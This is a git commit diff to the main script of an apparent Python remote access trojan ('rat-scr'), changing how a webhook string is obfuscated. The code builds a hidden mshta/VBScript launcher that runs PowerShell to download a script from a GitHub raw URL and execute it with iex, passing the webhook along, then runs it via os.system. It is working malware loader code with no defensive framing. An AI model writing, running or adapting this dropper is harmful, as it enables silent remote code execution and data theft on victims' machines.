6daa846c1276379384c8ea718c6dbefccccca6f8
43a1723 <hai1723notgay@gmail.com>
2024-08-19 17:08:43 +0700

    Update main.py

--- rat-scr/main.py
+++ rat-scr/main.py
@@ -1,9 +1,8 @@
 import os
 
-def xor_encrypt_decrypt(input_string):
-    key = 888172399
-    return ''.join(chr(ord(c) ^ key) for c in input_string)
+def obfuscate_string(s):
+    return ''.join(chr(((ord(c) - 3) % 256)) for c in s)
 
 webhook = "you_webhook"
-command = f'mshta.exe vbscript:createobject("wscript.shell").run("powershell $webhook=\'{xor_encrypt_decrypt(webhook)}\';iwr(\'https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/main.ps1\')|iex",0)(window.close)'
+command = f'mshta.exe vbscript:createobject("wscript.shell").run("powershell $webhook=\'{obfuscate_string(webhook)}\';iwr(\'https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/main.ps1\')|iex",0)(window.close)'
 os.system(command)
